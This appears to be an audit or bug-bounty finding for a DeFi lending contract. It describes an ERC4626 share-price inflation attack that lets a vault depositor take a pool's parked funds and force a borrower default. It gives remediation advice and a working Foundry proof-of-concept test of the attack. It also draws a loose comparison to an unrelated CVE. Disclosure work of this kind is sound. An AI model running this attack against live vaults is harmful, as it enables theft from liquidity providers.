### Title
ERC4626 share-price inflation on the programmable borrower's vault lets an unprivileged vault depositor steal parked pool funds and force a borrower default - (File: contracts/strategies/idle/ProgrammableBorrower.sol)

### Summary
`ProgrammableBorrower` parks all undrawn facility liquidity in an externally supplied ERC4626 `vault` and trusts its share price twice: `vault.deposit()` in `_depositToVault` accepts whatever shares the vault returns with no min-shares/slippage check [1](#0-0) , and `_currentVaultAssets()` prices the position via `convertToAssets` [2](#0-1) . An unprivileged user of that ERC4626 vault can inflate its share price (first-deposit + donation) so the pool's deposit mints ~0 shares, crystallizing the pooled capital as "vault loss" while the attacker redeems the inflated shares for the donated amount plus the pool's deposit — a direct analog of a planted artifact being picked up and executed inside a trusted path (CVE-2025-49144's uncontrolled search path).

### Finding Description
The lifecycle:

1. `onStartEpoch` deposits the entire on-hand underlying balance into the vault via `_depositToVault(balance, 0)` [3](#0-2) . `epochStartVaultAssets` is snapshotted from the pre-deposit asset value, not from received shares, so a donation-inflated vault silently records the full deposit as principal.
2. The attacker front-runs this (or pre-positions once the vault is configured/freshly set via `setVault`, which only requires `asset()` match and zero existing shares [4](#0-3) ): deposit 1 wei for 1 share, then transfer `D` underlying directly to the vault. Share price becomes ~`D`.
3. The pool's deposit `P < D` mints `floor(P * 1 / (D + 1)) = 0` shares. The pool's `P` now belongs to the vault, claimable by the attacker's single share.
4. `_vaultNetInterest` reports `loss ≈ P`, so `totalInterestDueNow()` returns 0 [5](#0-4) . At `stopEpoch`, `onStopEpoch` sees `shortfall > _currentVaultAssets()` and returns `true` [6](#0-5) , then `getFundsFromBorrower`'s `transferFrom` reverts for insufficient balance and `IdleCDOEpochVariant._stopEpoch` falls into `_handleBorrowerDefault` [7](#0-6) .
5. The pool is flagged `defaulted` and LPs take the loss through the default/recovery flow; the attacker redeems their vault share for `D + P`.

No guard stops this: `_skimDonatedAssets` only protects the CDO's own underlying balance, the CDO never inspects the vault's share supply, and `deposit`/`convertToAssets` are consumed verbatim. The attacker needs no privileged role — being a depositor in the configured ERC4626 vault is an unprivileged position.

### Impact Explanation
Direct theft of pool principal: the attacker captures `P` (up to the entire parked facility balance, minus donation cost `D > P`) and simultaneously triggers a hard borrower default, crystallizing the loss on tranche holders via `finalizeDefault`/`finalizeDefaultRecovery`. Quantified loss: `≈ P` (the pool's vault deposit) per attack; repeatable whenever `vault.balanceOf(address(this)) == 0` allows a vault swap or a fresh vault is configured.

### Likelihood Explanation
Requires an ERC4626 vault without inflation protection (no virtual share/asset offset) that is empty or near-empty when the pool first deposits — common for bespoke or freshly deployed credit vaults, and `setVault` can only be called when the position is zero, i.e., exactly when the vault is most exposed. Donation cost `D` must exceed `P`, so the attack is profitable only when the attacker can front `D` cheaply (e.g., borrowed/flash liquidity against a vault whose share price is donation-driven), but no privileged action or timing cooperation is needed — `startEpoch` is callable on a schedule and the vault deposit happens inside it.

### Recommendation
- In `_depositToVault`, enforce a minimum share out: `require(shares >= _assetAmount * minSharesRatio / ONE_TRANCHE_TOKEN)` or pass a `_principalAssets`-consistent expected-shares bound, so a manipulated price reverts the epoch start instead of crystallizing a loss.
- Alternatively value the vault position by shares-held × a sanity-checked price, or require the configured vault to implement OpenZeppelin's decimals-offset inflation defense and validate `vault.totalSupply() >= MIN_SUPPLY` before depositing.
- At minimum, revert `onStartEpoch`/`_depositToVault` when `vault.convertToAssets(shares)` deviates from `epochDepositedToVault`/`_assetAmount` beyond a small tolerance.

### Proof of Concept
Foundry fork test (drop into `test/foundry/`, modeled on `ProgrammableBorrowerCreditVault.t.sol`):

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import {ProgrammableBorrower} from "../../contracts/strategies/idle/ProgrammableBorrower.sol";
import {IdleCDOEpochVariant} from "../../contracts/IdleCDOEpochVariant.sol";
import {IERC20Detailed} from "../../contracts/interfaces/IERC20Detailed.sol";
import {ERC4626, ERC20} from "openzeppelin-contracts/contracts/token/ERC20/extensions/ERC4626.sol"; // no decimals offset

contract NaiveVault is ERC4626 {
    constructor(address asset_) ERC20("v", "v") ERC4626(IERC20(asset_)) {}
}

contract VaultInflationTheft is Test {
    // wired per existing harness: cdoEpoch, programmableBorrower, underlying, owner, manager
    IdleCDOEpochVariant cdoEpoch;
    ProgrammableBorrower pb;
    IERC20Detailed underlying;
    NaiveVault vault;
    address attacker = makeAddr("attacker");
    address manager = makeAddr("manager");

    function testInflationStealsParkedFunds() public {
        uint256 P = 1_000_000e6;   // pool idle balance to be parked
        uint256 D = 1_000_001e6;   // donation > P

        // Attacker is a plain user of the configured ERC4626 vault:
        deal(address(underlying), attacker, D + 1);
        vm.startPrank(attacker);
        underlying.approve(address(vault), 1);
        vault.deposit(1, attacker);                       // 1 wei -> 1 share
        underlying.transfer(address(vault), D);           // inflate share price to ~D
        vm.stopPrank();

        // Honest manager starts the epoch; pb.onStartEpoch deposits P into the vault
        deal(address(underlying), address(pb), P);
        vm.prank(address(cdoEpoch));
        pb.onStartEpoch(0);
        assertEq(vault.balanceOf(address(pb)), 0);        // pool got 0 shares
        assertEq(pb.vaultLoss(), P);                      // full deposit reported as loss

        // stopEpoch path: shortfall > vault assets -> getFundsFromBorrower fails -> default
        vm.warp(cdoEpoch.epochEndDate() + 1);
        vm.prank(manager);
        cdoEpoch.stopEpoch(0, 0);
        assertTrue(cdoEpoch.defaulted());                 // LP principal loss crystallized

        // Attacker redeems the single inflated share for D + P
        vm.prank(attacker);
        uint256 out = vault.redeem(1, attacker, attacker);
        assertEq(out, D + P);                             // profit = P
    }
}
```

Broken invariant: fair mint/burn across an external vault boundary — pool assets parked via `_depositToVault` are treated as principal at face value regardless of shares actually received, letting an unprivileged vault depositor convert the pool's deposit into their own withdrawal while the loss is socialized onto tranche holders through the default waterfall.
